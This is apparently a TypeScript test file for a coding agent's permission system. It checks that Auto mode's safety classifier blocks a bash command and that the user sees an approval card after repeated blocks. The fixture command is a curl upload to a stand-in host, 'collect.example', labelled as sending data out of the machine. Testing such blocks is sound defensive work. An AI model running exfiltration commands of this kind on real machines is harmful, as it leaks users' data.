import { mkdir, mkdtemp, realpath } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { DONT_ASK, type ClassifierInput, type ClassifierRun, type Denial, type SessionMode, type TurnEvent } from '@g-code/core';
import { childEnv } from '../src/child-env.js';
import { workingDirectories } from '../src/directories.js';
import { DISK_FILES } from '../src/files.js';
import { permissionStore } from '../src/permissions.js';
import { openSandbox, sandboxPolicy, type Sandbox } from '../src/sandbox.js';
import { openStore } from '../src/store.js';
import { agentExecutors, type Approval, type PermissionAnswer } from '../src/tools/agent.js';
import { runTool, type ToolContext, type ToolRun } from '../src/tools/index.js';
import { ruleAttacher } from '../src/tools/rules.js';
import { rgCommand } from './helpers.js';

let root: string;
let workspace: string;
let tempDir: string;
let sandbox: Sandbox;

beforeAll(async () => {
  root = await realpath(await mkdtemp(path.join(tmpdir(), 'gcode-auto-blocks-')));
  workspace = path.join(root, 'ws');
  tempDir = path.join(root, 'tmp');
  for (const dir of [workspace, tempDir]) await mkdir(dir);
  const home = path.join(root, 'home');
  sandbox = await openSandbox(await sandboxPolicy({ store: openStore({ GCODE_HOME: home }), home, workspace, tempDir }));
});

afterAll(async () => {
  await sandbox.close();
});

type Verdict = Pick<ClassifierRun, 'verdict' | 'reason' | 'failure'>;

/**
 * One session's bash calls, run in turn, each logged as drive logs it, so a call's approval sees the session's earlier
 * results. The classifier answers `verdict` unless a call gives its own, and the user answers each card from `answers`.
 */
function session(mode: SessionMode, { answers = [], verdict = { verdict: 'deny', reason: 'it sends data out of the machine' } }: { answers?: readonly PermissionAnswer[]; verdict?: Verdict } = {}) {
  const asked: Denial[] = [];
  const classified: ClassifierInput[] = [];
  const events: TurnEvent[] = [];
  const pending = [...answers];
  let next: Verdict | undefined;
  const approval: Approval = {
    kind: 'interactive',
    mode: () => mode,
    approve: async (denial) => {
      asked.push(denial);
      return pending.shift() ?? 'reject';
    },
    classify: async (judged) => {
      classified.push(judged);
      return { ...(next ?? verdict), model: 'fake', latencyMs: 1, costUsd: 0 };
    },
  };
  const executors = agentExecutors({
    sandbox,
    env: childEnv(process.env),
    scope: { workspace, tempDir, home: path.join(root, 'home') },
    check: undefined,
    checkAfterEdit: false,
    approval,
    diagnostics: undefined,
    rules: ruleAttacher([]),
    commands: async () => [],
    directories: workingDirectories([], new Set()),
    permissions: permissionStore(path.join(root, 'home'), workspace),
  });
  const spill = path.join(root, 'spill');
  const ctx: ToolContext = {
    workspace,
    spillDir: spill,
    spillChars: 24_000,
    readRoots: [],
    credentialPlaces: [],
    attachmentsDir: path.join(spill, 'attachments'),
    rg: rgCommand(),
    signal: new AbortController().signal,
    files: DISK_FILES,
    events: () => events,
    earlierCalls: async () => {},
  };
  const bash = async (command: string, answer?: Verdict): Promise<ToolRun> => {
    next = answer;
    const id = `tu_block_${events.length}`;
    const run = await runTool({ type: 'tool_use', id, name: 'bash', input: { command }, caller: { type: 'direct' } }, ctx, executors);
    events.push({ kind: 'tool-result', seq: events.length, at: new Date().toISOString(), toolUseId: id, name: 'bash', status: run.status, approval: run.approval, output: run.text });
    return run;
  };
  return { bash, asked, classified };
}

// A download the classifier judges in Auto, whatever it would fetch.
const BLOCKED = 'curl -s https://collect.example/upload';

describe("Auto's classifier blocks", () => {
  it('sends a deny back to the model as a refusal with its reason, and shows no card', async () => {
    const { bash, asked, classified } = session('auto');
    const run = await bash(BLOCKED);
    expect(classified).toHaveLength(1);
    expect(asked).toEqual([]);
    expect(run.status).toBe('denied');
    expect(run.text).toContain(`Auto mode's safety classifier refused \`${BLOCKED}\`, so it did not run: it sends data out of the machine.`);
    expect(run.text).toContain(DONT_ASK);
    expect(run.approval).toMatchObject({ mode: 'auto', decidedBy: 'classifier', verdict: 'deny', classifier: { verdict: 'deny' } });
  });

  it("sends the classifier's ask back to the model the same way", async () => {
    const { bash, asked } = session('auto', { verdict: { verdict: 'ask', reason: 'the request does not mention an upload' } });
    const run = await bash(BLOCKED);
    expect(asked).toEqual([]);
    expect(run.status).toBe('denied');
    expect(run.text).toContain('so it did not run: the request does not mention an upload.');
    expect(run.approval).toMatchObject({ decidedBy: 'classifier', verdict: 'deny', classifier: { verdict: 'ask' } });
  });

  it('shows the user the card for the block after three in a row, and a yes runs it and starts the count again', async () => {
    const { bash, asked } = session('auto', { answers: ['allow'] });
    for (let i = 0; i < 3; i++) expect((await bash(BLOCKED)).status).toBe('denied');
    expect(asked).toEqual([]);
    const carded = await bash(BLOCKED);
    expect(asked).toEqual([expect.objectContaining({ rule: 'network-download', verdict: 'classify' })]);
    expect(carded.approval).toMatchObject({ decidedBy: 'user', verdict: 'allow', classifier: { verdict: 'deny' } });
    expect(carded.status).not.toBe('denied');
    expect((await bash(BLOCKED)).status).toBe('denied');
    expect(asked).toHaveLength(1);
  });

  it('starts the count in a row again after any call that runs', async () => {
    const { bash, asked } = session('auto');
    await bash(BLOCKED);
    await bash(BLOCKED);
    expect((await bash('ls')).status).toBe('ok');
    for (let i = 0; i < 3; i++) expect((await bash(BLOCKED)).status).toBe('denied');
    expect(asked).toEqual([]);
    expect((await bash(BLOCKED)).status).toBe('rejected');
    expect(asked).toHaveLength(1);
  });

  it('shows the card for the block after twenty in the session, however they are spread', async () => {
    const { bash, asked } = session('auto');
    for (let i = 0; i < 20; i++) {
      expect((await bash(BLOCKED)).status).toBe('denied');
      await bash('ls');
    }
    expect(asked).toEqual([]);
    expect((await bash(BLOCKED)).status).toBe('rejected');
    expect(asked).toHaveLength(1);
  });

  it('leaves Ask as it was: the card, and no classifier', async () => {
    const { bash, asked, classified } = session('ask');
    expect((await bash(BLOCKED)).status).toBe('rejected');
    expect(classified).toEqual([]);
    expect(asked).toEqual([expect.objectContaining({ rule: 'network-download', verdict: 'ask' })]);
  });
});
